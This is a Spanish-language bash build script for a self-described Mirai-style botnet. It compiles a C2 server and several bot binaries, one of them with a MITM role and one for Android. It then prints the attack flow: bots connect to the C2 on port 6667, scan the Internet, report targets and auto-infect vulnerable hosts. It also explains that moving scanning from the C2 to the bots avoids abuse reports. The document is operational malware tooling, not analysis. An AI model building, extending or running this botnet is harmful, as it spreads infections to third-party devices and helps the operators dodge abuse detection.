#!/bin/bash
# Compilación Arquitectura Distribuida
# C2: Solo escucha y coordina (NO escanea)
# Bots: Escanean y se propagan (distributed_scanner.h)

echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  Compilando Arquitectura Distribuida (Mirai Style)          ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""

# Colors
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

# Verificar que distributed_scanner.h existe
if [ ! -f "distributed_scanner.h" ]; then
    echo -e "${RED}[ERROR]${NC} distributed_scanner.h no encontrado"
    echo "Este archivo es necesario para la arquitectura distribuida"
    exit 1
fi

echo -e "${YELLOW}[1/4]${NC} Compilando C2 Master (Servidor pasivo)..."
gcc c2_master_v3.c -o c2_master_v3 \
    -lssl -lcrypto -ljson-c -lpthread \
    -O2 -Wall 2>/dev/null

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓${NC} C2 Master compilado"
    echo "      Rol: SOLO escucha y coordina (NO escanea)"
else
    echo -e "${RED}✗${NC} Error compilando C2"
fi

echo ""
echo -e "${YELLOW}[2/4]${NC} Compilando Higurashi Immortal (Bot distribuido)..."
gcc higurashi_immortal.c -o higurashi_immortal \
    -lssl -lcrypto -ljson-c -lpthread \
    -O2 -Wall 2>/dev/null

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓${NC} Higurashi Immortal compilado"
    echo "      Rol: Escanea Internet, reporta al C2, auto-propaga"
else
    echo -e "${RED}✗${NC} Error compilando Higurashi"
fi

echo ""
echo -e "${YELLOW}[3/4]${NC} Compilando Bot Vivi v3 (MITM + Scanner)..."
gcc bot_vivi_v3.c -o bot_vivi_v3 \
    -lssl -lcrypto -ljson-c -lpthread \
    -O2 -Wall 2>/dev/null

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓${NC} Bot Vivi v3 compilado"
    echo "      Rol: MITM attack + scanner distribuido en background"
else
    echo -e "${RED}✗${NC} Error compilando Vivi"
fi

echo ""
echo -e "${YELLOW}[4/4]${NC} Compilando Bot Vivi Mini (Móvil)..."
gcc higurashi_mobile.c -o higurashi_mobile \
    -ljson-c -lpthread \
    -O2 -s -Wall 2>/dev/null

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓${NC} Bot Móvil compilado"
    echo "      Rol: Bot ligero para Android (sin scanner por performance)"
else
    echo -e "${RED}✗${NC} Error compilando móvil"
fi

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo -e "${GREEN}Arquitectura Distribuida Compilada${NC}"
echo ""
echo "┌─────────────────────────────────────────────────────────────┐"
echo "│ COMPONENTES                                                 │"
echo "├─────────────────────────────────────────────────────────────┤"
echo "│ [C2]  c2_master_v3       - Servidor pasivo (NO escanea)    │"
echo "│ [BOT] higurashi_immortal - Scanner + Auto-propagación      │"
echo "│ [BOT] bot_vivi_v3        - MITM + Scanner distribuido      │"
echo "│ [BOT] higurashi_mobile   - Bot móvil (sin scanner)         │"
echo "└─────────────────────────────────────────────────────────────┘"
echo ""
echo "Flujo de Ataque:"
echo "  1. C2 escucha en puerto 6667"
echo "  2. Bots se conectan al C2"
echo "  3. C2 envía comando: {\"action\":\"scanner\",\"state\":\"on\"}"
echo "  4. Bots escanean Internet desde SUAS IPs"
echo "  5. Bots reportan targets encontrados al C2"
echo "  6. Bots auto-infectan targets vulnerables"
echo ""
echo "Diferencia clave vs arquitectura anterior:"
echo "  ❌ ANTES: C2 escaneaba (abuse instantáneo)"
echo "  ✅ AHORA: Bots escanean (tráfico distribuido)"
echo ""
echo "Ver ARQUITECTURA_DISTRIBUIDA.md para más detalles"
echo ""
